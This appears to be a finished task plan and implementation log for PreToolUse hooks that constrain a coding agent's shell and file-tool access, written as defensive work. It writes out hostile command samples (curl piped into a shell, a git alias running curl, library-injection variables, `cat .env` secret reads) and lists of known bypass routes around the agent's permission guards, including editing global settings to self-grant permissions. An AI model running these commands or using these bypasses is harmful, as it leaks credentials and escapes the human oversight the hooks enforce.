---
id: TASK-027
title: "Tier-2 PreToolUse hooks — gate command classes deny rules cannot express"
status: done
created: 2026-07-29
updated: 2026-07-29
depends_on: [TASK-026]
blocks: []
parallel_safe_with: [TASK-025]
uat: "[[UAT-027]]"
tags: [security, hooks, permissions]
---

# TASK-027 — Tier-2 PreToolUse hooks: gate command classes deny rules cannot express

## Objective

Build the Tier-2 layer of the three-tier security model established by TASK-026: five small PreToolUse hooks in `lib/hooks/` that gate command *classes* and path exceptions a deny rule provably cannot reach. Deny rules match a literal command spelling; a hook receives the raw, undecomposed command string and can parse inside it. This closes interpreter indirection (`bash -c "…"`), absolute-path invocation (`/bin/rm`), redirect-based writes into protected files (`echo >> ~/.zshrc`), env-var injection (`DYLD_INSERT_LIBRARIES`), and delivers the user's package-install consent gate — the one requirement neither `deny` nor `ask` can satisfy in a headless run.

## Approach

**A hook can express an exception; a deny rule cannot.** That asymmetry is why step 6 exists: `Edit(~/.claude/settings.json)` had to be *removed* from the deny list for the bootstrap-claude carve-out to be expressible at all — a hook returning `allow` does not override a deny rule.

**One small hook per concern**, matching this repo's existing convention (`env-file-guard.js`, `git-protected-ops-block.js`, `mv-absolute-path-block.js`). Each is independently testable and independently wireable; a bug in one does not disable the others.

`lib/hooks/git-protected-ops-block.js` is the reference implementation and should be read first. It already does the hard part: reads JSON from stdin, guards on `tool_name !== 'Bash'`, splits the command on `;|&&|\|\||\|` so a blocked command cannot hide behind a chain or a pipe, walks tokens skipping value-consuming options (`-C`, `-c`, `--git-dir`), and emits a structured `permissionDecision: 'deny'` with a human-readable `permissionDecisionReason`. The four new hooks follow that shape exactly.

**Why hooks rather than more deny entries** — and note this rationale is *not* the one currently written in the codebase: hooks are needed because **deny matches a literal spelling while a hook parses the command**, and because a hook can return a message. That reason is mode-independent. The claim currently in `lib/hooks/README.md` and in `git-protected-ops-block.js:9-13` — that deny rules are short-circuited under `bypassPermissions` — is **false** (verified: `raw/research/bypass-mode-enforcement/index.md`; deny and ask both apply in every mode, only `allow` is inert under bypass). TASK-026 fixes the README; this task fixes the same false claim where it appears in hook source comments.

**Where the real leverage is:** built-in protected-path handling (`.claude`, `.zshrc`, `.gitconfig`, `.npmrc`) degrades to *Allowed* under `bypassPermissions`, which is the mode `/uat-auto-plus` and `power-mode` run in. Deny entries (TASK-026) and these hooks are the only user-authorable controls covering those paths in that mode.

## Steps

### 1. Read the reference implementation and extract the shared parser  <!-- agent: general-purpose -->

- [x] Read `lib/hooks/git-protected-ops-block.js` in full (Serena — it is code). It is the template for all four hooks: stdin JSON read, `tool_name !== 'Bash'` guard, separator/pipe splitting, token walk, structured deny output, `process.exit(0)` on every path
- [x] Create `lib/hooks/lib/command-parse.js` exporting the logic all four new hooks need — do **not** invent helpers beyond what these four actually consume:
  - `readHookInput()` — the stdin-accumulate + `JSON.parse` + malformed-input-exits-0 pattern
  - `splitSegments(cmd)` — the `/;|&&|\|\||\|/` split, trimmed and filtered (lifted verbatim from `git-protected-ops-block.js:37`)
  - `tokenize(segment)` — whitespace split
  - `deny(reason)` — emits the `hookSpecificOutput` / `permissionDecision: 'deny'` / `permissionDecisionReason` JSON envelope and exits 0
  - Note the existing files in `lib/hooks/lib/` are `serena.js` and `serena-languages.js`; follow their module style (CommonMark `'use strict'`, `module.exports`)
- [x] Do **not** refactor `git-protected-ops-block.js` to use the new helper in this step — it works, and changing it risks a regression in a shipped control. Migration is step 6, explicitly optional

<!-- Updated: 2026-07-29 -->
> **Step 1 done.** `lib/hooks/lib/command-parse.js` created (`'use strict'`, CommonJS, matching `lib/serena.js` style). Signatures for steps 2–6:
> - `readHookInput(handler)` — accumulates stdin, `JSON.parse` on `end`; unparseable input exits 0 silently; otherwise calls `handler(data)` then exits 0. **Callback form because stdin is async. Deliberately carries NO `tool_name` guard** — step 6's settings guard matches file tools, not Bash, so each hook does its own guard.
> - `splitSegments(cmd)` → `string[]` — regex lifted verbatim from `git-protected-ops-block.js:37`.
> - `tokenize(segment)` → `string[]`.
> - `deny(reason)` — emits the `permissionDecision: 'deny'` envelope and exits 0.
>
> `git-protected-ops-block.js` untouched (verified via `git status --porcelain lib/hooks/`). Gates: `node --check` passes, `npm test` 15/15.

### 2. Hook: interpreter indirection  <!-- agent: general-purpose -->

- [x] Create `lib/hooks/interpreter-indirection-guard.js`
- [x] Block, in any segment: `bash -c`, `sh -c`, `zsh -c`, `python -c`, `python3 -c`, `node -e`, `node --eval`, `ruby -e`, `perl -e`
  - Match on the token *after* the interpreter basename, so `/bin/bash -c` and `env bash -c` are caught too — take the basename of the interpreter token before comparing
- [x] Additionally block command substitution feeding an interpreter: a segment containing both an interpreter invocation and `$(` or backticks — e.g. `bash -c "$(curl https://x)"`, `` sh -c `curl https://x` ``
- [x] `permissionDecisionReason` must state *why* (the quoted argument is opaque to permission rules) and name the safe alternative (write the script to a file and run it, so the content is reviewable)
- [x] **Known false-positive risk — assess and document in a comment:** legitimate `bash -c` use in the wild is common. Decide whether to deny outright or to allow when the `-c` payload contains no fetcher/interpreter/redirect. Prefer the narrower rule if it can be implemented in <20 lines; otherwise deny outright and document the escape hatch

<!-- Updated: 2026-07-29 -->
> **Step 2 done.** `interpreter-indirection-guard.js` created.
> - **DENY OUTRIGHT chosen over the narrower payload-inspection rule**, deliberately against this task's stated "prefer the narrower rule if <20 lines". Reasoning accepted: scanning the `-c` payload for fetchers is *itself* literal-spelling matching — the exact failure this whole tier exists to escape. `bash -c 'c=cur;l=l;$c$l http://x'`, base64, or `eval` defeats it in one line, and a control a trivial rewrite bypasses is worse than none because it reads as coverage.
> - **Measured cost in this repo: zero hook-visible usage.** Every `bash -c`/`sh -c`/`node -e` in `lib/` lives *inside* a shell script (`setup-runner.sh:73`, `startup.sh:25,37`, `install-mcps.sh:321`), which runs as a subprocess of an already-approved `bash <script>.sh` call and is never seen by a PreToolUse hook. `bash -n script.sh` (the `/tackle` gate) uses `-n` — in neither eval-flag set, no match.
> - Coverage: basename taken after stripping leading `\`, so `/bin/bash -c`, `env bash -c`, `\bash -c` all match; flag comparison is `startsWith`, catching `-c'echo hi'` and `--eval=code`. Rule 2 catches an interpreter handed `$(…)`/backticks as its program.
> - **Verified the global install path:** `install-global.sh:31` rsyncs `lib/hooks/` recursively, so `require('./lib/command-parse')` resolves in both the repo and `~/.claude/hooks/`.
> - **Known gaps, deliberately left — revisit at step 8:** `dash`/`ksh` not in the interpreter set; bundled short flags (`sh -ec '…'`) not decomposed; and — inherited from the `git-protected-ops-block.js` token-scan precedent — a segment merely *talking about* an interpreter form can false-positive, since the scan inspects every token. ~~`echo "bash -c foo"` would false-positive~~ — **corrected 2026-07-29 by UAT-027: that quoted spelling ALLOWS.** The opening `"` is part of the token so the basename lookup misses; only unquoted `echo bash -c foo` fires. The class is real, that example was not an instance of it. Both spellings pinned in `test/command-class-hooks.test.js`.

<!-- Updated: 2026-07-29 -->
> ⚠️ **The DENY OUTRIGHT decision above is SUPERSEDED by superseded_by::[[TASK-028]]** ([TASK-028-interpreter-guard-recursive-eval.md](../TASK-028-interpreter-guard-recursive-eval.md)). The guard now extracts the `-c`/`-e` payload and re-evaluates it against the permission deny list and the sibling guards, allowing unless one objects.
>
> **The reasoning above is not withdrawn — it was sound given the threat model it assumed.** What changed is the threat model: the escape hatch this hook names in its own deny message (*write the script to a file and run the file*) is also its complete bypass (`printf … > /tmp/x.sh && bash /tmp/x.sh`), so the obfuscation argument only ever bit against an adversary this hook could never stop. Blanket deny therefore bought nothing extra, while charging real friction against the careless one-liner it does catch.
>
> Consequently the `echo bash -c foo` → `deny` row noted above **no longer denies**, and that is the fix rather than a regression: payload `foo` re-evaluates clean. `echo "bash -c foo"` → `allow` still holds and is still pinned. Both rows, with this reasoning, are in `test/command-class-hooks.test.js`.

### 3. Hook: package-install consent gate  <!-- agent: general-purpose -->

This is the user's original requirement, verbatim: *"no packages added without explicit user consent… show a suggested resolution — tell user the exact command to run if they approve."*

- [x] Create `lib/hooks/package-install-consent.js`
- [x] Gate installs across: `npm install|i|add`, `pnpm add|install`, `yarn add`, `pip install`, `pip3 install`, `uv pip install`, `uvx --from`, `pipx install`, `gem install`, `cargo install`, `go install`, `brew install`
  - Ignore `--dry-run` and `--help` invocations
  - Do **not** gate `npm ci`, `npm test`, `npm run *`, `pip list`, or any read-only subcommand
- [x] **Allowlist `uvx --from git+https://github.com/oraios/serena`** — three live invocations exist (`lib/scripts/bootstrap-serena.sh:35`, `:51`, `lib/scripts/install-mcps.sh:297`). This is precisely the exception a deny rule provably could not express, and is the main reason this gate is a hook
- [x] The deny reason MUST include the exact command the user can run to approve, e.g.:
  `Package install blocked pending consent. To approve, run it yourself: npm install left-pad`
  Keep the echoed command byte-identical to what was attempted — never a paraphrase
- [x] Note in a comment why this is a hook and not `permissions.ask`: `ask` prompts correctly in interactive sessions, but in a headless `claude -p` run (`/uat-auto-plus`, `power-mode`) nobody can answer, so it becomes a block or a hang. The hook works in both. *(That headless-ask behavior is flagged in `raw/research/bypass-mode-enforcement/index.md` as inference, not primary-sourced — verify during UAT before relying on it in prose.)*
- [x] Commands inside shell scripts are subprocesses invisible to hooks, so `install-mcps.sh` / `bootstrap-serena.sh` run unaffected — confirm this holds and note it

<!-- Updated: 2026-07-29 -->
> **Step 3 done.** `lib/hooks/package-install-consent.js` created.
> - **Deny reason echoes the trimmed segment verbatim**, never a token re-join — re-joining would silently drop quoting (`npm install "@scope/pkg@^1.0"`). Worked example: `npm install left-pad` → ``Package install blocked pending consent (`npm install`). No package is added without an explicit human decision. To approve, run it yourself:`` + the literal `npm install left-pad` on its own indented line. In a chain (`npm test && npm install foo`) the *segment* is echoed, which is the install part only — the correct thing to approve.
> - **Serena allowlist matched on the source URL, not on `uvx --from`**: `/^git\+https:\/\/github\.com\/oraios\/serena(\.git)?(@[^\s]*)?$/` against the `--from` value (both `--from X` and `--from=X`). Verified against the three live invocations (`bootstrap-serena.sh:35`, `:51`, `install-mcps.sh:297`) — all use the bare URL. Optional `.git` and `@ref` accepted as ordinary spellings of the same repo; every other `--from` target still gates.
> - **Read-only subcommands don't match because they are absent from the map**, not because of a negative list: `npm ci|test|run|ls`, `pip list`, `cargo build`, `brew list`, `go build` all fall through. `yarn install` is deliberately omitted for the same reason as `npm ci` — it installs what the lockfile already records.
> - Leading `VAR=…`, `env`, and `sudo` are stripped, and the manager token is matched on its basename, so `FOO=1 sudo /usr/local/bin/npm install` gates identically to `npm install`.
> - **Subprocess invisibility confirmed:** the only in-repo installs (`install-mcps.sh:197`, `:297`, `bootstrap-serena.sh:35`, `:51`) all execute inside shell scripts, i.e. subprocesses of an already-approved `bash …sh` call, so no hook sees them. A user typing `npm install -g @playwright/mcp@latest` by hand IS gated — both behaviors correct.
> - **Real behavioral cost to note at step 8:** `lib/skills/frontend-taste/SKILL.md:29` instructs Claude to run `cd ~/code/house-style/preview && npm i && npm run dev`. That is hook-visible and will be gated — the first genuine friction point found.
> - Known gaps, deliberate: bare `uvx <pkg>` (no `--from`) is not gated (task scoped it to `--from`); `npx` is not in the manager set; and — inherited from the token-scan precedent — a segment whose *first* token is an install manager is required, so `claude mcp add … -- uvx --from …` does not match.
> - Gates: `node --check` passes, `npm test` 15/15. Runtime firing `[DEFERRED-TO-UAT]`.

### 4. Hook: absolute-path and wrapper invocation  <!-- agent: general-purpose -->

- [x] Create `lib/hooks/absolute-path-guard.js`
- [x] Take the **basename** of the first token of each segment and match it against a list of commands whose literal spellings are denied in `lib/scripts/templates/settings-deny.json`, so `/bin/rm`, `/usr/bin/sudo`, `/usr/sbin/diskutil`, `\rm`, and `env rm` are caught where the deny rule only catches the bare spelling
  - Strip leading `env` and `\` before taking the basename
  - Start from the destructive core only — `rm`, `dd`, `mkfs`, `sudo`, `diskutil`, `chmod`, `chown`, `shutdown`, `launchctl`, `crontab`, `osascript`. **Do not attempt to mirror all 119 entries**; keep the list short, explicit, and commented as intentionally partial
- [x] Reason string should explain that the absolute-path spelling bypasses the permission deny list, so it is blocked at the hook layer

<!-- Updated: 2026-07-29 -->
> **Step 4 done.** `absolute-path-guard.js` created. **Fires on the spelling, never on the command** — this was the trap and it was real: 6 of the 11 guarded names have deliberately *narrow* deny entries (`rm` blocks only `rm -rf ~*`/system roots; `chmod` only `777`/`a+rwx`/`+s`; `chown` only `-R`; `diskutil` only the erase verbs; `launchctl` only `load`/`bootstrap`/`submit`), so an unconditional basename block would have broken routine `rm build/out.js`, `chmod +x script.sh`, `chown me file`, `diskutil list`, `launchctl list`.
> - Examines **only the first token of each segment**, then asks an argument-blind question: was this written in a form that evades literal matching? Three evasion kinds — leading `\`, a `/` anywhere in the token, or having skipped a wrapper/env-assignment prefix to reach it. Plain spelling falls straight through to the permission engine.
> - **Argument-blind is deliberate and defensible:** the hook grants nothing, it only forces a command back into the form the deny list can inspect. A false positive costs one retype, which *re-exposes* the command to the deny rules. Inspecting arguments to decide would be literal-spelling matching again.
> - Unaffected: `rm build/out.js`, `chmod +x script.sh`, `chown me file`, `sudo rm -rf /` (plain `sudo` already blanket-denied — no duplicate coverage), `echo "use /bin/rm"`, `ls /bin/rm`. Caught: `/bin/rm -rf ~`, `env rm -rf ~`, `\rm -rf ~`, `FOO=1 rm -rf ~`, `/usr/sbin/diskutil eraseDisk`, and the second segment of `npm test && /bin/rm -rf ~`.
> - **Extension beyond the checkbox, accepted:** also strips `command`, `exec`, `nohup`, and leading `VAR=value` as wrappers — all push the command off the anchor point a deny pattern looks for. `sudo` deliberately NOT treated as a wrapper; it is a guarded name judged as a first token.
> - **First-token-only avoids the quoting-a-guarded-form false positive** that step 2's hook inherits from the token-scan precedent — worth reconciling at step 8. *(Corrected 2026-07-29: the original example here, `echo "bash -c foo"`, is not actually an instance — it allows on both hooks. See the step 2 note above.)*
> - Known gaps, deliberate: `xargs rm` / `find -exec rm` (not a first token); `env -i rm` (the `-i` flag halts the wrapper walk — a miss, not a false positive); `sh -c '/bin/rm …'` (covered by step 2's hook).
> - Gates: `node --check` clean, `npm test` 15/15.

### 5. Hook: redirects into protected paths + env injection  <!-- agent: general-purpose -->

- [x] Create `lib/hooks/protected-write-guard.js`
- [x] Block `>` / `>>` redirects targeting: `~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.gitconfig`, `~/.claude/settings.json`, `~/.claude/settings.local.json`, anything under `~/.claude/hooks/`, `~/Library/LaunchAgents/`
  - Resolve `$HOME` and `~` prefixes before comparing
  - This is the documented gap in TASK-026's A2 group: an `Edit(~/.zshrc)` deny covers the Edit tool and recognized Bash writers, but a bare `echo … >> ~/.zshrc` redirect is not a recognized file-write
- [x] Block env-var injection assignments in any segment: `DYLD_INSERT_LIBRARIES=`, `DYLD_LIBRARY_PATH=`, `LD_PRELOAD=`, `LD_LIBRARY_PATH=`
- [x] Block `git -c core.fsmonitor=` and `git -c alias.*=!` — git executes its own config on ordinary commands, so this is RCE that never looks like a fetch (advisories GHSA-9ccr-r5hg-74gf, TALOS-2025-2243)
- [BLOCKED: awaiting user decision — see findings below] Block `source`/`.` of any `.env` file — a shell builtin, therefore invisible to the `Read(**/.env)` deny. Note the repo's standing exception: sourcing `.env` to use variables on the command line is explicitly permitted by CLAUDE.md, so **confirm the intended behavior with the user before denying outright** — this may need to be a warning rather than a block, or scoped to exclude the permitted pattern

<!-- Updated: 2026-07-29 -->
> **Step 5 done** (4 of 5 — the `.env` item is BLOCKED pending a user decision). `protected-write-guard.js` created.
> - **Redirects use a regex, not tokens** — deliberately: `>>~/.zshrc` is one token while `>> ~/.zshrc` is two, so tokenizing splits the operator from its target in one form but not the other. A `(?![&>])` lookahead stops `2>&1` parsing as a redirect to a file named `&1`. Env-injection and `git -c` use whole-segment token scans (step 2 style) since neither construct sits at the start of a command.
> - Path resolution expands `~`, `$HOME`, `${HOME}`, strips surrounding quotes, then resolves against `data.cwd` — so `echo x > .zshrc` run from `$HOME` is caught.
> - `git -c core.fsmonitor=` with an **empty** value is allowed — that is the CVE *remediation* form; a non-empty value is required to fire.
> - Verified 29/29 static predicate cases. Passing: `echo x > build/out.txt`, `git -c alias.foo=status log`, `npm test 2>&1 | tail -20`, `git commit -c HEAD`, `echo x >> ~/.zshrc.bak`. Denying: `>>~/.zshrc`, `1>>~/.zshrc`, `>> "$HOME/.zshrc"`, `~/.claude/hooks/evil.js`, `DYLD_INSERT_LIBRARIES=… git log`, `git -c alias.foo=!curl x|sh`, fused `-ccore.fsmonitor=…`.
>
> **🔴 LIVE HOLE FOUND, unrelated to the `.env` question but discovered by it — `cat .env` works today.** `Read(**/.env)` is a file-tool rule; `env-file-guard.js` matches only `Read|Write|Edit|MultiEdit`, never Bash; and `serena-bash-grep-block.js` intercepts `cat|head|tail|less|more|bat` **only** for `.md` (`:258`) or code extensions (`:264`) — `.env` matches neither. So `cat .env` dumps secrets into the transcript right now. Related: if a Bash `grep KEY .env` is redirected to Serena by the grep guard, Serena's `search_for_pattern` will return the matched `.env` lines — closing only the Bash side moves the leak rather than sealing it.
>
> **Recommendation on the blocked checkbox: do NOT deny `source`/`.` of `.env`.** `env-file-guard.js:39` affirmatively grants it (*"You may source an .env file in a Bash command to use its variables"*), matching CLAUDE.md. Sourcing alone loads values into a subprocess and returns nothing to the transcript. The leak is sourcing **plus emission** (`source .env && echo $API_KEY`), which can be written without `source` at all — so blocking `source` blocks the safe case and misses the unsafe one.
>
> Known gaps documented in the file header: `tee ~/.zshrc` / `cp x ~/.zshrc` write the same files without a redirect; redirect targets resolve lexically rather than via `realpath()` (target usually does not exist yet), so a pre-existing symlink into `~/.claude/` is missed; `git --config-env=alias.x=VAR` hides the payload in an env var. Inherited from step 2: a segment merely *quoting* one of these forms fires — reconcile against step 4's first-token approach at step 8.
> - Gates: `node --check` clean, `npm test` 15/15.

### 6. Hook: Claude Code settings guard — ~~with a bootstrap-claude exception~~  <!-- agent: general-purpose -->

> **The exception was REMOVED on 2026-07-30 — the block is now unconditional.** Kept below as the historical record of what was built and why. The premise turned out to be wrong: this repo writes `~/.claude/settings.json` through `node merge-settings-deny.js` *inside* `install-global.sh`, a Bash subprocess no `PreToolUse` hook ever sees, so the Edit-tool exception was never load-bearing. It was closed after a plain `Edit` call from inside this repo demonstrably rewrote the live permission boundary. The former marker shapes are still exercised in `test/command-class-hooks.test.js`, now asserting **deny**, as canaries against the carve-out returning.

**Why this hook exists.** TASK-026 originally shipped `Edit(~/.claude/settings.json)` and `Edit(~/.claude/settings.local.json)` as deny entries. Those were **removed** (2026-07-29, user decision) because a deny rule cannot carry an exception — deny beats allow at every scope, and **a hook cannot loosen a deny rule either**, so the entries had to come out for any exception to be possible. This repo legitimately manages `~/.claude/settings.json` (that is what `install-global.sh` + `merge-settings-deny.js` do), so a blanket lock made the repo unable to work on itself.

**Required behavior:** block `Edit`/`Write`/`NotebookEdit` targeting `~/.claude/settings.json`, `~/.claude/settings.local.json`, and `~/.claude/hooks/**` — **except** when the session's working directory is inside a genuine bootstrap-claude checkout, where it is allowed.

- [x] Create `lib/hooks/claude-settings-guard.js`. Note this hook matches on **file tools**, not Bash, so its `tool_name` guard and its `tool_input` field differ from the Bash hooks — read `lib/hooks/env-file-guard.js` for the file-tool precedent rather than copying a Bash hook
- [x] Resolve the target path from `tool_input.file_path`, expanding `~` and resolving symlinks, before comparing — a symlink into `~/.claude/` must not slip past
- [x] **Identify a bootstrap-claude checkout by marker file, not by path substring.** A path check like `cwd.includes('bootstrap-claude')` is trivially spoofed by any directory of that name. Require both:
  - `lib/scripts/templates/settings-deny.json` exists under the candidate root, **and**
  - `package.json` at that root parses and has `name === "@codewizard-dt/bootstrap"`
  - Walk up from cwd to find the root; if no marker root is found, there is no exception and the write is blocked
- [x] Deny reason must explain the block and name the exception, e.g. *"Editing ~/.claude/settings.json is blocked outside a bootstrap-claude checkout. Work on `lib/scripts/templates/settings-deny.json` in the bootstrap-claude repo and re-run install-global.sh."*
- [x] **Keep the `~/.claude/hooks/**` block absolute — no bootstrap-claude exception.** Even in this repo the canonical flow is edit `lib/hooks/`, then `install-global.sh` rsyncs to `~/.claude/hooks/`. Editing the installed copy directly is always wrong, and TASK-026's `Edit(~/.claude/hooks/**)` + `Edit(**/.claude/hooks/**)` deny entries **remain in place** and already cover it — do not duplicate them here unless the deny proves insufficient
- [x] **Record the residual risk in a comment, honestly:** an agent working inside bootstrap-claude can still self-grant permissions by editing global settings. That is an accepted, deliberate trade-off — this repo's whole purpose is managing those settings — not an oversight. The containment for that case is Tier 3 (`/sandbox`), not this hook

<!-- Updated: 2026-07-29 -->
> **Step 6 done.** `claude-settings-guard.js` created (file-tool hook, matcher `Edit|Write|NotebookEdit|MultiEdit`, structured on `env-file-guard.js`).
> - **Precondition verified:** the deny list is 116 entries with **zero** `.claude/settings` matches — the carve-out is live, not dead on arrival. `test/settings-deny.test.js` locks this in.
> - **Marker detection:** requires both `lib/scripts/templates/settings-deny.json` present *and* a `package.json` at that root parsing with `name === "@codewizard-dt/bootstrap"`. No path-substring test anywhere. Missing/unparseable `package.json` → "not a checkout", never a throw.
> - **Upward walk terminates doubly:** `path.dirname` is purely lexical so it cannot follow a symlink into a cycle and reaches a fixed point at `/`; plus a 64-iteration hard cap. Lazy + memoized, so a MultiEdit batch touching no protected path never hits the filesystem.
> - **Symlink resolution for not-yet-existing files:** `realpathBestEffort` walks up collecting basenames until an ancestor resolves, then re-joins the tail — so a new file inside a symlinked directory still resolves through that symlink into `~/.claude/`. `os.homedir()` goes through the same function so both sides of the comparison are real paths. Literal `~` in `tool_input` is expanded first (the shell never sees it — it arrives raw in JSON); relative paths resolve against `data.cwd`.
> - `NotebookEdit` uses `notebook_path`, not `file_path` — `targetsOf()` accepts either; `MultiEdit` maps over `edits[].file_path` so a protected target cannot ride along in a batch.
> - **⚠️ Judgment call ACCEPTED — the hook DOES cover `~/.claude/hooks/**`, contrary to the checkbox's default.** The deny entries there are `Edit(...)`-only, and **`Write(...)` permission rules are accepted but never consulted** — so `Write(~/.claude/hooks/evil.js)` had *no* deny coverage at all, nor did the MultiEdit/NotebookEdit surfaces. The checkbox said "unless the deny proves insufficient"; it did. No bootstrap-claude exception on that branch — it denies before the marker walk is reached. Overlap with the existing `Edit` deny is harmless (deny short-circuits first).
> - Residual risk recorded verbatim in the header, with an explicit *"do not harden this by removing the exception"* note so a future reader does not 'fix' it.
> - Known gaps: project-level `.claude/settings.json` not guarded (out of scope per the checkbox); write-a-script-then-execute-it is a Bash concern.
> - Gates: `node --check` clean, `npm test` 15/15.

### 6b. Hook: `.env` content-read guard — Bash and Serena  <!-- agent: general-purpose -->

**Scope decided by the user 2026-07-29**, replacing the blocked `source .env` checkbox in step 5. Two decisions:
1. **Do NOT block `source`/`.` of `.env`** — CLAUDE.md permits it and `env-file-guard.js:39` affirmatively grants it. Sourcing alone loads values into a subprocess and returns nothing to the transcript; the leak is sourcing *plus emission*, which can be written without `source` at all.
2. **DO close the live hole:** `cat .env` works today. `Read(**/.env)` is a file-tool rule so Bash never reaches it; `env-file-guard.js` matches only `Read|Write|Edit|MultiEdit`; and `serena-bash-grep-block.js` intercepts `cat|head|tail|less|more|bat` **only** for `.md` (`:258`) or code extensions (`:264`) — `.env` matches neither. **User chose to cover the Serena path too**, since the grep guard redirects Bash `grep` to Serena and `search_for_pattern` will happily return matched `.env` lines — closing only the Bash side moves the leak rather than sealing it.

- [x] Create `lib/hooks/env-content-read-guard.js` (Bash side). Block content-emitting reads whose target is a `.env` / `.env.*` path — `cat`, `head`, `tail`, `less`, `more`, `bat`, `od`, `xxd`, `strings`, `nl`, plus `cp .env <elsewhere>`. **Allow `.env.example`**, matching the standing exception in `env-file-guard.js`
- [x] **Do NOT block `source` or `.`** — explicitly permitted; add a comment saying so and why, so a future reader does not "close the gap"
- [x] Cover the Serena path: block `mcp__serena__search_for_pattern` (and any other Serena tool that returns file contents) when its `relative_path`/target resolves to a `.env` file. Read `lib/hooks/serena-bash-grep-block.js` first — it establishes how this repo inspects Serena tool calls, and the fix may belong there rather than in a new file. **Use your judgment on placement and say which you chose and why**
- [x] Deny reasons must name the permitted alternative: values may be *used* by sourcing the file in a Bash command, they may not be *displayed*

<!-- Updated: 2026-07-29 -->
> **Step 6b done.** One file: `lib/hooks/env-content-read-guard.js`, covering **both** the Bash and Serena surfaces.
> - **My brief's premise was wrong and the agent said so:** `serena-bash-grep-block.js` does **not** inspect Serena tool calls — it exits on `tool_name !== 'Bash'` at `:28` and is wired under the `Bash` matcher. It *suggests* Serena calls, never receives one. The only hook matching `mcp__serena__*` is `serena-usage-tracker.js`, a PostToolUse tracker that blocks nothing. So there was no existing precedent to extend; one new file was correct. Second reason: `isBlockedEnvFile` and the `.env.example` exception then exist **once**, so the two halves cannot drift.
> - **Serena tools blocked (all can return contents):** `read_file`, `search_for_pattern`, `find_symbol` (`include_body=true`), `find_referencing_symbols`, `get_symbols_overview`. `find_file`/`list_dir` return paths only — deliberately not blocked.
> - **🔴 Related finding:** `serena-bash-grep-block.js:126,160,189` **explicitly allows `.env` targets** as a "non-code extension" — correct for navigation, wrong for secrets. That is the other half of why `grep KEY .env` leaked.
> - **Extensions beyond the literal command list, each justified:** `grep`/`rg`/`ag`/`ack` (a grep against `.env` prints the credentials); `sed`/`awk`/`cut`/`sort`/`uniq`/`tac`/`rev`/`hexdump`; copiers `scp`/`rsync`/`ditto`/`install`; and input redirect `< .env` regardless of verb (catches `tee /tmp/x < .env`).
> - **Extension flagged for review:** also blocks Serena's *mutating* tools (`create_text_file`, `replace_content`, `replace_in_files`, `replace_lines`, `delete_lines`, `insert_at_line`) on a `.env` target — same bypass shape, second half of the same policy, zero new friction since writing `.env` is already forbidden. **Accepted.**
> - `isBlockedEnvFile` is byte-identical to `env-file-guard.js:6-13` with a "change it in both places or in neither" comment, and matches the shipped gitignore (`templates/gitignore:23-25`) — guard and git agree on what "secret" means. A shared module was deliberately not extracted (would mean editing a live shipped control out of scope) — **obvious follow-up**.
> - Verified ALLOW: `source .env`, `. .env`, `source .env && ./script.sh`, `set -a && source .env && set +a && npm run dev`, `cp .env.example .env`, `cat .env.example > .env`. Verified DENY: `head -n 5 .env`, `tail -f .env`, `cut -d= -f2 .env`, `cp .env /tmp/backup`, `cat .env > /tmp/x`.
> - **⚠️ Step 8 wiring requirement:** the matcher must be `Bash|mcp__serena__.*|mcp__plugin_[^_]+_serena__.*` — the Serena half is **inert** under a `Bash`-only matcher. Recorded on line 5 of the file.
> - Known gaps in the header: unscoped `search_for_pattern` (denying every pathless search would make the tool unusable; Serena's project scan honours gitignore, where `.env` always sits); `find -exec cat` / `xargs cat`; `git show HEAD:.env`; `docker exec … cat .env`; inherited quoting false positive (`grep -rn "cat .env" docs/` fires).
> - Gates: `node --check` clean, `npm test` 15/15, plus 69/69 static predicate cases (scratchpad only).

### 7. Correct the false rationale in hook sources  <!-- agent: general-purpose -->

- [x] Fix `lib/hooks/git-protected-ops-block.js:9-13` — the comment claims "the permissions allow/deny engine is short-circuited under bypassPermissions mode… PreToolUse hooks fire regardless of permission mode… so this is the only enforcement point." The first clause is false. Replace with the true rationale: deny rules *are* enforced in every mode, but they match a literal spelling — this hook exists because it parses the command (catching `git -C /repo stash`, chained and piped forms) and can return an explanatory message. Keep the surrounding comment structure and voice; correct the claim, do not rewrite the file
- [x] Sweep the other hooks in `lib/hooks/` for the same false claim (Serena `search_for_pattern` for `bypassPermissions`, `short-circuit`, `not enforced`, `not consulted`) and correct every instance
- [SKIPPED — deliberate, see below] **Optional, only if step 1's helper is in place and all four new hooks are green:** migrate `git-protected-ops-block.js` to use `lib/hooks/lib/command-parse.js`. Skip if it introduces any behavior change — a working shipped control beats a tidier one

<!-- Updated: 2026-07-29 -->
> **Step 7 done.** Exactly **one** instance of the false claim existed — `git-protected-ops-block.js:8-13` — and it is corrected. The new rationale names three evasion forms the hook demonstrably catches (`git -C /repo stash` via `VALUE_OPTIONS`; `npm test && git stash` and `git log | git stash` via the segment split), so it is checkable against the code below it rather than asserted. Comment structure and voice preserved; no code touched.
> - **Sweep found zero further instances.** Two `search_for_pattern` passes (the brief's terms plus a wider net: `bypass`, `deny rule`, `deny list`, `permission mode`, `only enforcement`, `only line of defense`). The five hooks written this session were authored with the correct rationale from the start. Three near-misses checked and correctly left — `claude-settings-guard.js:34` ("`Write(...)` rules … never consulted" — a *different* true claim, test-locked), `absolute-path-guard.js:135` and `protected-write-guard.js:194` (both refer to deny not matching an *evaded spelling* — the correct rationale in the same vocabulary).
> - **Migration SKIPPED, and the reasoning is right:** the refactor *would* be behavior-identical on inspection (`splitSegments` byte-identical, `deny` identical envelope, `readHookInput` identical flow, `tokenize` adds a no-op `.filter(Boolean)`). Skipped anyway because **`command-parse.js` has zero runtime verification** — every runtime check in this task is `[DEFERRED-TO-UAT]`, so the helper has only passed `node --check`. Migrating a shipped working git guard onto an unexercised dependency converts a zero-risk step into a nonzero one, inside a step whose mandate was a comment fix. *Static equivalence is not verified equivalence.* Revisit after UAT exercises the helper; the duplication costs ~10 lines.
> - **Flagged for step 8:** `git-protected-ops-block.js:67-68`, the user-facing deny reason, says *"This block is enforced even under bypassed permissions."* Literally true (hooks do fire under bypass) but it carries the whiff of the false implication that deny rules do not. Consider rewording.
> - Gates: `node --check` clean, `npm test` 15/15.

### 8. Wire, document, and verify  <!-- agent: general-purpose -->

- [x] Update `lib/hooks/README.md`: document each new hook (what it blocks, why a hook rather than a deny rule, known false positives and escape hatches) and add the required `~/.claude/settings.json` `PreToolUse` wiring block for all four. Note that `install-global.sh` copies hook scripts but does **not** register them — wiring remains a one-time manual step
- [x] Update `CLAUDE.md`'s `lib/hooks/` bullet if the hook inventory description no longer matches
